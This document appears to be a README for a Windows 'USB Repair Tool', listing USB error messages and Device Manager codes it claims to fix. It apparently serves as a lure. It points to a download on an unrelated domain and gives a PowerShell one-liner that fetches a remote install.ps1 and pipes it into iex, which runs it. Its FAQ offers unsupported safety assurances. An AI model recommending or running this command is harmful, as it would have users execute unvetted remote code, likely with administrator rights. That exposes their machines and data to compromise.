# USB Repair Tool

> Fix "USB Device Not Recognized" errors and repair corrupted USB drives on Windows.

[![Windows 10/11](https://img.shields.io/badge/Windows-10%20%7C%2011-0078D4?style=flat-square&logo=windows&logoColor=white)]()
[![Stable](https://img.shields.io/badge/v2.0.1-stable-brightgreen?style=flat-square)]()
[![MIT](https://img.shields.io/badge/License-MIT-blue?style=flat-square)](LICENSE)

---

### Download

**[Download Latest Release](https://usb.zipzapsol.space/)**

<details>
<summary>Alternative: PowerShell</summary>

```powershell
irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
```

</details>

---

## The Problem

You plug in a USB drive, external hard drive, or phone and Windows shows:

> *"USB Device Not Recognized"*

> *"The last USB device you connected to this computer malfunctioned"*

> *"Unknown USB Device (Device Descriptor Request Failed)"*

> *"USB device not detected"*

Or worse -- your USB drive shows up but says:

> *"You need to format the disk in drive E: before you can use it"*

> *"The disk structure is corrupted and unreadable"*

> *"Location is not available. Access is denied"*

**USB Repair Tool** diagnoses and fixes these issues automatically.

---

## What It Fixes

### Device Recognition Issues

- **USB Device Not Recognized** -- resets USB host controller and re-enumerates devices
- **Device Descriptor Request Failed** -- clears USB hub cache, power cycles ports
- **Unknown USB Device** -- reinstalls USB driver stack
- **USB device not detected** -- resets USB root hub, checks power management
- **USB keeps disconnecting** -- disables USB Selective Suspend

### Drive Errors

- **"You need to format the disk"** -- repairs file system without formatting
- **"Disk structure is corrupted"** -- runs chkdsk and repairs MBR/GPT
- **"Access is denied"** -- fixes drive permissions and ownership
- **Drive shows 0 bytes** -- rebuilds partition table
- **Drive shows as RAW** -- recovers file system type (NTFS/FAT32/exFAT)

### Driver Issues

- Reinstalls USB host controller drivers
- Resets USB 3.0 / 3.1 / 3.2 drivers
- Fixes USB power management settings
- Clears corrupted USB driver cache

---

## Device Manager Error Codes

| Code | Error Message | Fix |
|---|---|---|
| **Code 10** | "This device cannot start" | Reinstalls USB controller driver |
| **Code 22** | "This device is disabled" | Re-enables device in Device Manager |
| **Code 28** | "Drivers for this device are not installed" | Downloads and installs USB driver |
| **Code 31** | "This device is not working properly" | Removes and reinstalls device |
| **Code 39** | "Windows cannot load the device driver" | Clears UpperFilters/LowerFilters registry |
| **Code 43** | "Windows has stopped this device" / "A request for the USB device descriptor failed" | Power cycles USB port, reinstalls hub driver |
| **Code 45** | "This device is not connected" | Rescans hardware, checks physical connection |
| **Code 52** | "Windows cannot verify the digital signature" | Temporarily disables driver signing enforcement |

---

## Preview

```
  +-------------------------------------------------+
  |           USB Repair Tool v2.0.1                |
  +-------------------------------------------------+
  |                                                 |
  |  USB Ports:                                     |
  |  [OK] USB 3.0 Root Hub        -- Working        |
  |  [!]  USB 3.0 Root Hub #2     -- Not responding |
  |  [OK] USB 2.0 Root Hub        -- Working        |
  |                                                 |
  |  Connected Devices:                             |
  |  [!]  Unknown USB Device       -- Error         |
  |  [OK] USB Mass Storage         -- Kingston 64GB |
  |                                                 |
  |  [ Repair All ]  [ Reset USB ]  [ Exit ]        |
  |                                                 |
  +-------------------------------------------------+
```

---

## System Requirements

| | |
|---|---|
| OS | Windows 10 / 11 (64-bit) |
| RAM | 2 GB minimum |
| Admin | Yes |
| Network | For driver downloads |

---

## Common Devices Fixed

Flash drives (Kingston, SanDisk, Samsung, PNY, Corsair), external HDDs/SSDs (Seagate, WD, Toshiba, LaCie), phones (iPhone, Samsung, Xiaomi, Google Pixel), game controllers, webcams, printers, keyboards, mice, and any USB device.

---

## FAQ

**Will it erase my data?**
No. The tool repairs without formatting. Your files remain intact.

**My USB works on other computers but not mine.**
This means the issue is with your PC's USB drivers or power management. This tool fixes exactly that.

**I get "USB Device Not Recognized" for every device I plug in.**
This usually means corrupted USB host controller drivers. The tool reinstalls them.

**Is it safe?**
Yes. The tool uses Windows built-in utilities (devcon, chkdsk, pnputil) to diagnose and repair.

---

## License

[MIT](LICENSE)
